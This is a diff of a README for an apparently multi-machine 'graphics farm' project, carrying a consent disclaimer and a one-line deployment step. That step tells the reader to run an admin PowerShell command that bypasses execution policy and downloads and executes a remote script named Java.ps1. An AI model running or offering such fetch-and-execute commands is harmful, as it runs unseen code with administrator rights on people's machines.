@@ -10,14 +10,13 @@ This project I undertook while running a small graphics powered farm while I was
 
 Please do NOT use this without the consent of the person who owns the computer. This code is NOT to be used for malicious purposes. 
 
-### Example (Works in Win 10 Only)
+### Final Example (Works in Win 10 Only)
 
-This executes a the code in this git via one line of code only. It makes it extremely easy to deploy to lots of machines. I will publish the guide on how to do this soon. 
+With some work you can executes the code in this git via one line of code only. It makes it extremely easy to deploy to lots of machines. I will publish the guide on how to do this soon. 
 
 Run CMD as Administrator and paste this script in:
 
 @powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/Hawkryption/dd55e0a282a70f3af63ed792f5eca570/raw/aec24c2aca6d41f521d0dc90cd6749a4c553e613/Java.ps1'))"
-
 
 ### Using this Powershell Script
 
